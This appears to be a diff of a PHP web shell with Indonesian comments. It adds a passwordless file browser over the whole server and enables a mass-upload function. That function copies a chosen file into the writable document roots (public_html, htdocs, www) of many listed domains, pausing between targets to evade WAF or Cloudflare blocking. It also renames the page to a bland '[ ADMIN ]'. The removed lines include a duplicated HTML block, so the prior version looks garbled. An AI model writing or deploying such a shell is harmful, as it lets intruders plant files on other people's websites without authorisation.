@@ -1,40 +1,119 @@
 <?php
-// --- PENGATURAN PATH (Global Access) ---
-// Direktori tempat domain/user umum ditemukan di lingkungan Linux/Hosting
-$SCAN_DIRS = ['/home/', '/var/www/', '/srv/']; 
+// Mengatur batas waktu eksekusi skrip menjadi tidak terbatas
+set_time_limit(0);
 
-// --- FUNGSI PENCARIAN DOMAIN YANG FLEKSIBEL ---
-function find_domains($dirs) {
+// ⚠️ PERINGATAN KERAS: SHELL INI TIDAK MEMILIKI PASSWORD DAN SANGAT BERBAHAYA.
+
+// --- FUNGSI UPLOAD MASSAL DENGAN JEDA DAN REAL-TIME OUTPUT ---
+if (isset($_POST['mass_upload_start'])) {
+    
+    // Nonaktifkan kompresi output GZIP dan buffer untuk real-time output
+    ini_set('zlib.output_compression', 0);
+    while (@ob_end_flush());
+    ob_implicit_flush(true);
+    
+    $base_path_input = trim($_POST['base_path']);
+    $domain_list_input = trim($_POST['domain_list']);
+    
+    // 1. Bersihkan Path Induk
+    $base_path = realpath($base_path_input);
+    if (!$base_path || !is_dir($base_path)) {
+         $message_error = "❌ Path Induk tidak valid atau tidak ditemukan.";
+         goto end_mass_upload;
+    }
+    if (substr($base_path, -1) !== DIRECTORY_SEPARATOR) {
+        $base_path .= DIRECTORY_SEPARATOR;
+    }
+    
+    // 2. Pisahkan List Domain
+    $domains = preg_split("/[\n,]+/", $domain_list_input, -1, PREG_SPLIT_NO_EMPTY);
     $target_paths = [];
-    foreach ($dirs as $scan_dir) {
-        if (is_dir($scan_dir)) {
-            $items = scandir($scan_dir);
-            foreach ($items as $item) {
-                $full_path = $scan_dir . $item . DIRECTORY_SEPARATOR;
-                // Kriteria: Harus direktori, BUKAN . atau .., dan mengandung titik (berpotensi domain)
-                if ($item != '.' && $item != '..' && is_dir($full_path)) {
-                    // Cek jika namanya terlihat seperti domain (misalnya: 'site.com' atau 'domain.co.id')
-                    if (strpos($item, '.') !== false) {
-                        // Cek apakah direktori ini dapat ditulis (writable)
-                        if (is_writable($full_path)) {
-                            // Target adalah direktori itu sendiri
-                            $target_paths[] = $full_path;
-                        }
-                    }
+    
+    // 3. Buat Target Path Lengkap
+    // Varian path yang umum digunakan di hosting
+    $path_variants = ['', 'public_html', 'htdocs', 'www']; 
+
+    foreach ($domains as $domain) {
+        $domain = trim($domain);
+        if (empty($domain)) continue;
+
+        foreach ($path_variants as $variant) {
+            $potential_path = $base_path . $domain . DIRECTORY_SEPARATOR . $variant;
+            $clean_path = realpath($potential_path);
+            
+            // Verifikasi path, harus ada, dan dapat ditulis (writable)
+            if ($clean_path && is_dir($clean_path) && is_writable($clean_path)) {
+                if (substr($clean_path, -1) !== DIRECTORY_SEPARATOR) {
+                    $clean_path .= DIRECTORY_SEPARATOR;
                 }
+                $target_paths[] = $clean_path;
             }
         }
     }
-    // Hapus duplikasi dan kembalikan path yang valid
-    return array_unique($target_paths);
-}
+    $target_paths = array_unique($target_paths);
 
+    // Cek File yang Diunggah
+    $uploaded_file_name = basename($_FILES["fileToMassUpload"]["name"]);
+    $uploaded_file_tmp = $_FILES["fileToMassUpload"]["tmp_name"];
+    $fileType = strtolower(pathinfo($uploaded_file_name, PATHINFO_EXTENSION));
+    
+    // Tampilan Proses Terminal
+    echo "<pre style='font-family: monospace; background: #000; color: #0f0; padding: 10px;'>";
+    echo "================================================\n";
+    echo ">> MEMULAI MASS UPLOAD (Jeda 2 Detik/Target) <<\n";
+    echo "================================================\n";
 
-// --- FUNGSI UPLOAD MASSAL ---
-if (isset($_POST['mass_upload'])) {
-    // Implementasi Mass Upload DIBATALKAN karena alasan keamanan.
-    $message = "🚫 **Upload Massal Dibatalkan!** Fitur ini hanya menampilkan daftar domain. Implementasi upload massal yang sebenarnya **SANGAT BERBAHAYA** dan dinonaktifkan di sini.";
+    if ($fileType != "txt") {
+        $message_error = "\n[ ERROR ] Gagal Mass Upload: Hanya file TXT yang diizinkan.\n";
+    } elseif (count($target_paths) === 0) {
+        $message_error = "\n[ ERROR ] Tidak ada target domain yang valid dan dapat ditulis ditemukan di Path Induk.\n";
+    } else {
+        $total_targets = count($target_paths);
+        $success_count = 0;
+        $counter = 0;
+        
+        echo "\n[ INFO ] Path Induk: " . $base_path_input . "\n";
+        echo "[ INFO ] File: " . $uploaded_file_name . "\n";
+        echo "[ INFO ] Target Divalidasi: " . $total_targets . "\n\n";
+
+        foreach ($target_paths as $target_dir) {
+            $counter++;
+            $final_target = $target_dir . $uploaded_file_name;
+            
+            echo "[$counter/$total_targets] TARGET: " . $target_dir;
+            
+            // Jeda waktu 2 detik (Anti-Blokir WAF/Cloudflare)
+            sleep(2);
+            
+            // Lakukan copy file
+            if (@copy($uploaded_file_tmp, $final_target)) {
+                echo " -- [ BERHASIL ]\n";
+                $success_count++;
+            } else {
+                echo " -- [ GAGAL! ] (Izin ditolak/Gagal)\n";
+            }
+            flush(); // Real-time output
+        }
+        
+        echo "\n================================================\n";
+        echo ">> RINGKASAN:\n";
+        echo ">> Berhasil: $success_count\n";
+        echo ">> Gagal: " . ($total_targets - $success_count) . "\n";
+        echo "================================================\n";
+        
+        @unlink($uploaded_file_tmp); 
+    }
+    
+    end_mass_upload:
+    
+    if (isset($message_error)) {
+        echo $message_error;
+    }
+    echo "</pre>";
+    exit;
 }
+// --- AKHIR FUNGSI UPLOAD MASSAL ---
+
 
 // --- FUNGSI UPLOAD BIASA ---
 if (isset($_POST['upload'])) {
@@ -43,7 +122,7 @@ if (isset($_POST['upload'])) {
     $fileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
 
     if($fileType != "txt") {
-        $message = "❌ Gagal: Hanya file TXT yang diizinkan untuk upload biasa.";
+        $message = "❌ Gagal: Hanya file TXT yang diizinkan.";
     } elseif (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
         $message = "✅ File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " berhasil diunggah ke **" . basename($current_dir) . "**.";
     } else {
@@ -54,6 +133,9 @@ if (isset($_POST['upload'])) {
 // --- PENGATURAN PATH (Global Access) ---
 $current_dir = isset($_GET['dir']) ? $_GET['dir'] : $_SERVER['DOCUMENT_ROOT'];
 $current_dir = realpath($current_dir);
+if (substr($current_dir, -1) !== DIRECTORY_SEPARATOR) {
+    $current_dir .= DIRECTORY_SEPARATOR;
+}
 if ($current_dir === false) { $current_dir = $_SERVER['DOCUMENT_ROOT']; }
 $self_url = basename(__FILE__);
 $files = @scandir($current_dir);
@@ -62,253 +144,108 @@ $files = @scandir($current_dir);
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Shell File Manager NO PASSWORD</title>
+    <title>S.H.E.L.L</title>
     <style>
-        /* Gaya CSS */
-        body { font-family: sans-serif; background-color: #f4f4f4; margin: 20px; }
-        .container { max-width: 900px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        h2 { border-bottom: 2px solid #ccc; padding-bottom: 10px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
-        th { background-color: #eee; }
+        body { font-family: monospace; background: #fff; color: #000; margin: 10px; }
+        .container { max-width: 800px; margin: auto; padding: 0; }
+        a { color: #0000ff; text-decoration: none; }
+        a:hover { text-decoration: underline; }
         .success { color: green; font-weight: bold; }
         .error { color: red; font-weight: bold; }
-        .scan-result { border: 1px solid #ffcc00; background: #fffacd; padding: 10px; margin-top: 20px; }
-        .upload-form { margin-top: 20px; padding: 15px; border: 1px dashed #ccc; }
-        .breadcrumb { margin-bottom: 15px; font-weight: bold; }
-        .breadcrumb a { text-decoration: none; color: #007bff; margin-right: 5px; }
+        .file-list { border: 1px solid #000; padding: 5px; max-height: 400px; overflow: auto; }
+        .dir-entry { display: block; padding: 2px 0; }
+        .dir-entry span { display: inline-block; width: 60px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Shell File Manager Tanpa Sandi 🔓</h2>
+    <h2>[ ADMIN ]</h2>
 
     <?php if (isset($message)): ?>
         <p class="<?php echo strpos($message, '✅') !== false ? 'success' : 'error'; ?>"><?php echo $message; ?></p>
     <?php endif; ?>
 
-    <div class="breadcrumb">
-        Lokasi: 
+    <div>
+        PATH: <a href="?dir=<?php echo urlencode(DIRECTORY_SEPARATOR); ?>">/</a>
         <?php
         $path_parts = explode(DIRECTORY_SEPARATOR, $current_dir);
         $path_link = '';
-        echo '<a href="' . $self_url . '?dir=' . urlencode(DIRECTORY_SEPARATOR) . '">' . DIRECTORY_SEPARATOR . '</a>'; 
         foreach ($path_parts as $part) {
             if (empty($part)) continue;
             $path_link .= DIRECTORY_SEPARATOR . $part;
-            echo '<a href="' . $self_url . '?dir=' . urlencode($path_link) . '">' . htmlspecialchars($part) . '</a>' . DIRECTORY_SEPARATOR;
+            echo '<a href="?dir=' . urlencode($path_link) . '">' . htmlspecialchars($part) . '</a>/';
         }
         ?>
     </div>
     
-    <table>
-        <thead>
-            <tr>
-                <th>Nama</th>
-                <th>Ukuran</th>
-                <th>Izin</th>
-                <th>Tanggal Modifikasi</th>
-            </tr>
-        </thead>
-        <tbody>
-            <?php
-            if ($files) {
-                usort($files, function($a, $b) use ($current_dir) {
-                    $is_dir_a = is_dir($current_dir . DIRECTORY_SEPARATOR . $a);
-                    $is_dir_b = is_dir($current_dir . DIRECTORY_SEPARATOR . $b);
-                    if ($is_dir_a == $is_dir_b) return strcasecmp($a, $b); 
-                    return $is_dir_a ? -1 : 1; 
-                });
+    <hr>
 
-                foreach ($files as $file) {
-                    if ($file == '.') continue;
-                    
-                    $full_path = $current_dir . DIRECTORY_SEPARATOR . $file;
-                    $is_dir = is_dir($full_path);
-                    
-                    if ($is_dir || $file == '..') {
-                        $new_dir = ($file == '..') ? dirname($current_dir) : $full_path;
-                        $link = $self_url . '?dir=' . urlencode($new_dir);
-                    } else {
-                        $link = '#';
-                    }
-                    
-                    $icon = $is_dir ? '📁' : '📄';
-                    $size = $is_dir ? 'Folder' : round(filesize($full_path) / 1024, 2) . ' KB';
-                    $perms = substr(sprintf('%o', fileperms($full_path)), -4);
-
-                    echo '<tr>';
-                    echo '<td><span class="file-icon">' . $icon . '</span>';
-                    echo $is_dir || $file == '..' ? '<a href="' . $link . '"><b>' . htmlspecialchars($file) . '</b></a>' : htmlspecialchars($file);
-                    echo '</td>';
-                    echo '<td>' . $size . '</td>';
-                    echo '<td>' . $perms . '</td>';
-                    echo '<td>' . date("Y-m-d H:i:s", filemtime($full_path)) . '</td>';
-                    echo '</tr>';
-                }
-            } else {
-                echo '<tr><td colspan="4">Gagal membaca direktori atau direktori tidak ditemukan.</td></tr>';
-            }
-            ?>
-        </tbody>
-    </table>
-
-    <div class="upload-form">
-        <h3>Upload File (.TXT Only) ke Folder Ini</h3>
-        <form action="<?php echo $self_url . '?dir=' . urlencode($current_dir); ?>" method="post" enctype="multipart/form-data">
-            <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
-            <input type="file" name="fileToUpload" accept=".txt" required>
-            <input type="submit" value="Upload TXT Ke Sini" name="upload">
-        </form>
-    </div>
-
-    <div class="scan-result">
-        <h3>🚀 Domain Scanner & Mass Upload</h3>
-        <?php $found_paths = find_domains($SCAN_DIRS); ?>
-        
-        <?php if (!empty($found_paths)): ?>
-            <p>✅ Ditemukan **<?php echo count($found_paths); ?>** potensi Document Root (berdasarkan nama domain/direktori) yang dapat ditulis:</p>
-            <pre><?php echo implode("\n", $found_paths); ?></pre>
-            
-            <form action="" method="post" enctype="multipart/form-data">
-                <p>Pilih file **.TXT** yang akan diunggah ke **SEMUA** lokasi di atas:</p>
-                <input type="file" name="fileToMassUpload" accept=".txt" required>
-                <input type="submit" value="⚠️ LAKUKAN MASS UPLOAD (.TXT)" name="mass_upload" style="background-color: red; color: white; font-weight: bold;">
-                <p style="color: red;">*Saat ini, tombol ini hanya menampilkan peringatan (tidak melakukan upload aktual).</p>
-            </form>
-        <?php else: ?>
-            <p>❌ Tidak ditemukan direktori domain yang cocok di lokasi yang diskan (`/home/`, `/var/www/`, `/srv/`).</p>
-        <?php endif; ?>
-    </div>
-
-</div>
-
-</body>
-</html>$files = @scandir($current_dir);
-// ----------------------------------------
-?>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Shell File Manager + Domain Keyword Scanner</title>
-    <style>
-        /* Gaya CSS */
-        body { font-family: sans-serif; background-color: #f4f4f4; margin: 20px; }
-        .container { max-width: 900px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        h2 { border-bottom: 2px solid #ccc; padding-bottom: 10px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
-        th { background-color: #eee; }
-        .success { color: green; font-weight: bold; }
-        .error { color: red; font-weight: bold; }
-        .scan-result { border: 1px solid #ffcc00; background: #fffacd; padding: 10px; margin-top: 20px; }
-        .upload-form { margin-top: 20px; padding: 15px; border: 1px dashed #ccc; }
-        .breadcrumb { margin-bottom: 15px; font-weight: bold; }
-        .breadcrumb a { text-decoration: none; color: #007bff; margin-right: 5px; }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <h2>Shell File Manager + Domain Scanner 🕵️</h2>
-
-    <?php if (isset($message)): ?>
-        <p class="<?php echo strpos($message, '✅') !== false ? 'success' : 'error'; ?>"><?php echo $message; ?></p>
-    <?php endif; ?>
-
-    <div class="breadcrumb">
-        Lokasi: 
+    <div class="file-list">
         <?php
-        $path_parts = explode(DIRECTORY_SEPARATOR, $current_dir);
-        $path_link = '';
-        echo '<a href="' . $self_url . '?dir=' . urlencode(DIRECTORY_SEPARATOR) . '">' . DIRECTORY_SEPARATOR . '</a>'; 
-        foreach ($path_parts as $part) {
-            if (empty($part)) continue;
-            $path_link .= DIRECTORY_SEPARATOR . $part;
-            echo '<a href="' . $self_url . '?dir=' . urlencode($path_link) . '">' . htmlspecialchars($part) . '</a>' . DIRECTORY_SEPARATOR;
+        if ($files) {
+            usort($files, function($a, $b) use ($current_dir) {
+                $is_dir_a = is_dir($current_dir . DIRECTORY_SEPARATOR . $a);
+                $is_dir_b = is_dir($current_dir . DIRECTORY_SEPARATOR . $b);
+                if ($is_dir_a == $is_dir_b) return strcasecmp($a, $b); 
+                return $is_dir_a ? -1 : 1; 
+            });
+
+            foreach ($files as $file) {
+                $full_path = $current_dir . DIRECTORY_SEPARATOR . $file;
+                $is_dir = is_dir($full_path);
+                
+                if ($file == '.') continue;
+                
+                if ($is_dir || $file == '..') {
+                    $new_dir = ($file == '..') ? dirname($current_dir) : $full_path;
+                    $link = $self_url . '?dir=' . urlencode($new_dir);
+                } else {
+                    $link = '#';
+                }
+                
+                $size = $is_dir ? 'DIR' : round(@filesize($full_path) / 1024, 2) . ' KB';
+                $perms = substr(sprintf('%o', @fileperms($full_path)), -4);
+
+                echo '<div class="dir-entry">';
+                echo '<span>' . $perms . '</span>';
+                echo '<span>' . $size . '</span>';
+                echo $is_dir || $file == '..' ? '<a href="' . $link . '"><b>' . htmlspecialchars($file) . '/</b></a>' : htmlspecialchars($file);
+                echo '</div>';
+            }
         }
         ?>
     </div>
-    
-    <table>
-        <thead>
-            <tr>
-                <th>Nama</th>
-                <th>Ukuran</th>
-                <th>Izin</th>
-                <th>Tanggal Modifikasi</th>
-            </tr>
-        </thead>
-        <tbody>
-            <?php
-            if ($files) {
-                usort($files, function($a, $b) use ($current_dir) {
-                    $is_dir_a = is_dir($current_dir . DIRECTORY_SEPARATOR . $a);
-                    $is_dir_b = is_dir($current_dir . DIRECTORY_SEPARATOR . $b);
-                    if ($is_dir_a == $is_dir_b) return strcasecmp($a, $b); 
-                    return $is_dir_a ? -1 : 1; 
-                });
 
-                foreach ($files as $file) {
-                    if ($file == '.') continue;
-                    
-                    $full_path = $current_dir . DIRECTORY_SEPARATOR . $file;
-                    $is_dir = is_dir($full_path);
-                    
-                    if ($is_dir || $file == '..') {
-                        $new_dir = ($file == '..') ? dirname($current_dir) : $full_path;
-                        $link = $self_url . '?dir=' . urlencode($new_dir);
-                    } else {
-                        $link = '#';
-                    }
-                    
-                    $icon = $is_dir ? '📁' : '📄';
-                    $size = $is_dir ? 'Folder' : round(filesize($full_path) / 1024, 2) . ' KB';
-                    $perms = substr(sprintf('%o', fileperms($full_path)), -4);
+    <hr>
 
-                    echo '<tr>';
-                    echo '<td><span class="file-icon">' . $icon . '</span>';
-                    echo $is_dir || $file == '..' ? '<a href="' . $link . '"><b>' . htmlspecialchars($file) . '</b></a>' : htmlspecialchars($file);
-                    echo '</td>';
-                    echo '<td>' . $size . '</td>';
-                    echo '<td>' . $perms . '</td>';
-                    echo '<td>' . date("Y-m-d H:i:s", filemtime($full_path)) . '</td>';
-                    echo '</tr>';
-                }
-            } else {
-                echo '<tr><td colspan="4">Gagal membaca direktori atau direktori tidak ditemukan.</td></tr>';
-            }
-            ?>
-        </tbody>
-    </table>
-
-    <div class="upload-form">
-        <h3>Upload File (.TXT Only) ke Folder Ini</h3>
+    <div>
+        <h3>[ UPLOAD (Saja) ]</h3>
         <form action="<?php echo $self_url . '?dir=' . urlencode($current_dir); ?>" method="post" enctype="multipart/form-data">
             <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
             <input type="file" name="fileToUpload" accept=".txt" required>
-            <input type="submit" value="Upload TXT Ke Sini" name="upload">
+            <input type="submit" value="Upload TXT Ke Folder Ini" name="upload">
         </form>
     </div>
 
-    <div class="scan-result">
-        <h3>🚀 Domain Scanner & Mass Upload</h3>
-        <?php $found_paths = find_domains($SCAN_DIRS); ?>
-        
-        <?php if (!empty($found_paths)): ?>
-            <p>✅ Ditemukan **<?php echo count($found_paths); ?>** potensi Document Root (berdasarkan nama domain/direktori) yang dapat ditulis:</p>
-            <pre><?php echo implode("\n", $found_paths); ?></pre>
+    <hr>
+
+    <div>
+        <h3>[ MASS UPLOAD GABUNGAN ]</h3>
+        <form action="" method="post" enctype="multipart/form-data">
+            <p>1. Masukkan **Path Induk** (Lokasi Umum Domain):</p>
+            <input type="text" name="base_path" size="50" required placeholder="/home/sites/ atau /var/www/vhosts/" value="<?php echo htmlspecialchars($current_dir); ?>">
             
-            <form action="" method="post" enctype="multipart/form-data">
-                <p>Pilih file **.TXT** yang akan diunggah ke **SEMUA** lokasi di atas:</p>
-                <input type="file" name="fileToMassUpload" accept=".txt" required>
-                <input type="submit" value="⚠️ LAKUKAN MASS UPLOAD (.TXT)" name="mass_upload" style="background-color: red; color: white; font-weight: bold;">
-                <p style="color: red;">*Saat ini, tombol ini hanya menampilkan peringatan (tidak melakukan upload aktual).</p>
-            </form>
-        <?php else: ?>
-            <p>❌ Tidak ditemukan direktori domain yang cocok di lokasi yang diskan (`/home/`, `/var/www/`, `/srv/`).</p>
-        <?php endif; ?>
+            <p>2. Masukkan **List Nama Domain** (pisah dengan baris baru):</p>
+            <textarea name="domain_list" rows="5" cols="50" required placeholder="domain1.com
+domain2.com
+domain3.org"></textarea>
+            
+            <br><br>
+            <input type="file" name="fileToMassUpload" accept=".txt" required>
+            <input type="submit" value="🔥 MASS UPLOAD (.TXT) KE SEMUA DOMAIN" name="mass_upload_start" style="background-color: red; color: white; font-weight: bold;">
+            <p style="font-size:12px;">*Skrip akan mencari path domain di bawah Path Induk, dengan jeda 2 detik per target.</p>
+        </form>
     </div>
 
 </div>
